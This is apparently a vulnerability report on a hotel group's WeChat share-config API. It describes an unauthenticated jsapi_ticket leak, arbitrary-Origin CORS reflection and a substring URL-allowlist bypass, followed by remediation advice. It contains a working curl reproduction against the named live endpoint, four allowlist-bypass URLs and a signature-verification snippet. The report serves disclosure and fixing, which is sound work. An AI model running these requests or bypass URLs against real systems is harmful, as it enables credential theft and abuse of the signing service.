# F001: 未授权泄露微信 JSAPI Ticket 且签名接口 URL 白名单可绕过

- Severity: High
- Status: Confirmed
- Affected asset: `https://newunion.huazhu.com/api/mp/share`
- Preconditions: 无需登录；公网可访问；任意第三方网页 Origin 可读取响应。

## Summary

`newunion.huazhu.com` 的微信分享配置接口在未授权情况下返回微信公众号 `appId=wx9a40654fe6ac86f8` 的原始 `jsapi_ticket`，同时返回 `signature/timestamp/noncestr/jsApiList`。该接口还配置了任意 Origin 反射 CORS：`Access-Control-Allow-Origin: <attacker origin>` 与 `Access-Control-Allow-Credentials: true`，第三方网页可以直接读取 ticket。

进一步验证发现，`url` 参数的白名单校验可被绕过：只要 URL 字符串中出现 `campaign.huazhu.com`，即使真实主机是 `evil.invalid` 或 `campaign.huazhu.com.evil.invalid`，接口仍返回 ticket 并为该 URL 签发 JSSDK signature。

## Impact

- 泄露短期有效但可持续刷新获取的微信 `jsapi_ticket`，外部攻击者可作为签名 oracle 为 URL 生成 JSSDK 签名。
- `jsApiList` 包含敏感能力：`getLocation`、`scanQRCode`、`chooseWXPay`、`uploadImage`、`uploadVoice`、`addCard/openCard` 等。
- 若攻击者可结合任一华住微信安全域名下的 XSS/可控页面/开放跳转，可能以华住公众号上下文调用微信 JS-SDK 能力。
- 即便不考虑微信客户端域名白名单，原始 `jsapi_ticket` 不应下发到前端，当前接口构成敏感凭据泄露与签名服务滥用。

Key observed response properties:

```http
GET /api/mp/share?url=https%3A%2F%2Fcampaign.huazhu.com.evil.invalid%2Fpath HTTP/1.1
Host: newunion.huazhu.com
Origin: https://attacker.invalid

HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://attacker.invalid
Access-Control-Allow-Credentials: true
Content-Type: application/json;charset=UTF-8
```

Response contains these fields（ticket 已在报告中脱敏；完整原始证据保存在 JSON 文件）:

```json
{
  "status": 200,
  "data": {
    "appId": "wx9a40654fe6ac86f8",
    "noncestr": "...",
    "jsapi_ticket": "bxLdikRXVbTPdHSM...REDACTED...",
    "timestamp": "1783590368",
    "url": "https://campaign.huazhu.com.evil.invalid/path",
    "signature": "607da498a178fb12071ea2d8ac3d5f43be9d87c1",
    "jsApiList": ["getLocation", "scanQRCode", "chooseWXPay", "uploadImage", "..."]
  },
  "message": "prd",
  "errorCode": 0
}
```

The returned signature was independently recomputed and matched:

```text
sha1("jsapi_ticket=<returned_ticket>&noncestr=<returned_noncestr>&timestamp=<returned_timestamp>&url=<returned_url>")
= returned signature
```

Confirmed URL-validation bypass cases, all returned `jsapi_ticket` and valid matching signature:

```text
https://campaign.huazhu.com.evil.invalid/path
https://evil.invalid/path?next=https://campaign.huazhu.com/mgm-h5/
https://evil.invalid@campaign.huazhu.com/path
https://campaign.huazhu.com%2eevil.invalid/path
```

Browser PoC result from third-party origin `http://127.0.0.1:8787`:

```json
{
  "origin": "http://127.0.0.1:8787",
  "status": 200,
  "readable": true,
  "appId": "wx9a40654fe6ac86f8",
  "has_jsapi_ticket": true,
  "signed_url": "https://campaign.huazhu.com.evil.invalid/path",
  "jsApiList_count": 34
}
```

## Reproduction

1. Send a request from any Origin:

```bash
curl -i 'https://newunion.huazhu.com/api/mp/share?url=https%3A%2F%2Fevil.invalid%2Fpath%3Fnext%3Dhttps%3A%2F%2Fcampaign.huazhu.com%2Fmgm-h5%2F' \
  -H 'Origin: https://attacker.invalid'
```

2. Observe:

- HTTP 200.
- `Access-Control-Allow-Origin: https://attacker.invalid`.
- `Access-Control-Allow-Credentials: true`.
- JSON body includes `data.jsapi_ticket`, `data.signature`, `data.url` set to the attacker-controlled URL, and a broad `jsApiList`.

3. Verify signature locally:

```python
import hashlib
s = 'jsapi_ticket={ticket}&noncestr={noncestr}&timestamp={timestamp}&url={url}'
print(hashlib.sha1(s.encode()).hexdigest())
```

The digest equals `data.signature`.

## Root cause

- Sensitive WeChat `jsapi_ticket` is returned to the frontend instead of being kept server-side.
- CORS policy reflects arbitrary Origin and enables credentials on this API.
- URL allowlist appears to use substring matching rather than canonical URL parsing and exact hostname / registrable-domain validation.

## Remediation

- Never return `jsapi_ticket` to clients. Keep it server-side and return only `appId/timestamp/noncestr/signature` if needed.
- Validate `url` by canonical parsing (`scheme`, `hostname`, `port`) and strict allowlist matching; reject query-string/userinfo/encoded-host bypasses.
- Remove arbitrary Origin reflection. Use an explicit allowlist and remove `Access-Control-Allow-Credentials` unless strictly needed.
- Reduce `jsApiList` to the minimal APIs required per page.
- Add server-side tests for URL bypass cases above and rotate/expire the exposed ticket cache if applicable.

## Verification after fix

- The API response must not contain `jsapi_ticket`.
- Requests with `Origin: https://attacker.invalid` must not receive readable CORS headers.
- URLs such as `https://evil.invalid/path?next=https://campaign.huazhu.com/` and `https://campaign.huazhu.com.evil.invalid/` must be rejected.
